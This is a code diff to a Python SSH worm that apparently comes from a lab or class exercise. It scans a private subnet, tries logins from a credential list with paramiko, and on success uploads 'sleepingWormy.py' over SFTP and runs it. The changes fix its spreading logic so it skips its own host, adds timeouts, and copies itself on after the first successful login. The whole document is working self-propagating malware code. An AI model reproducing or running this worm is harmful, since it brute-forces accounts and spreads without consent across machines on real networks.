@@ -10,6 +10,7 @@ Program worm should first:
 import paramiko
 import sys
 import os
+import socket
 
 ip_range = []
 
@@ -28,7 +29,7 @@ A function that creates IP addresses and adds them to the ip_range list in the r
 from 192.168.137.2 - 192.168.137.254
 """
 def generate_IP_list():
-    for i in range(2, 255):
+    for i in range(143, 145): 
         ip = "192.168.137." + str(i)
         ip_range.append(ip)
 
@@ -39,11 +40,27 @@ A function that iterates through the IP range and tries to SSH into each IP usin
 def start_ssh_devices():
 
     for ip in ip_range:
-        print("Trying to ssh to Host : ", ip)
+        print("\nTrying to ssh to Host : ", ip)
+        print("\n--------------------------------\n")
+        
+        try:
+            original_host_name = socket.gethostname() # the host generated from the built in function
+            host_name_by_ip = socket.gethostbyaddr(ip) # host generated from the IP address
+            network_host_name = host_name_by_ip[0].replace(".mshome.net", "") # get the machine name and remove .mshome.net (added by the IP scanning program)
+            print("Hostname :  ",original_host_name) 
+            print("Second host", network_host_name)
+            if original_host_name == network_host_name:
+                print ("Skip running the SSH scan on myself")
+                continue
+
+        except Exception:
+            print("Host not found so skip the rest")
+            continue
 
         ssh_connection = paramiko.SSHClient()
 
         ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
 
         for credential in user_credentials_list:
 
@@ -58,14 +75,16 @@ def start_ssh_devices():
                     " and password: ",
                     password,
                 )
-                ssh_connection.connect(ip, username=username, password=password)
+                ssh_connection.connect(ip, username=username, password=password, timeout=1) # added timeout to save time
+                
+                print("SSH to host ", ip, " succeeded! I am inside hahaha!!!")
 
-            except paramiko.AuthenticationException:
+                copy_worm_excute(ssh_connection)
+                break
+
+            except Exception:
                 print("SSH to host ", ip, " failed...")
-
-            print("SSH to host ", ip, " succeeded! I am inside hahaha!!!")
-
-            copy_worm_excute(ssh_connection)
+            
 
 
 """
@@ -75,7 +94,7 @@ def copy_worm_excute(ssh_connx):
 
     worm_file = "sleepingWormy.py"
 
-    print("Uploading file now")
+    print("Copying worm and excuting it now")
 
     ssh_sftp = ssh_connx.open_sftp()
 
@@ -96,6 +115,7 @@ def start_attack():
 
 
 if __name__ == "__main__":
+
     generate_IP_list()
     start_ssh_devices()
 
@@ -103,3 +123,4 @@ if __name__ == "__main__":
     if len(sys.argv) > 1:
         if sys.argv[1] == "1":
             start_attack()
+            #print("inside if statement")
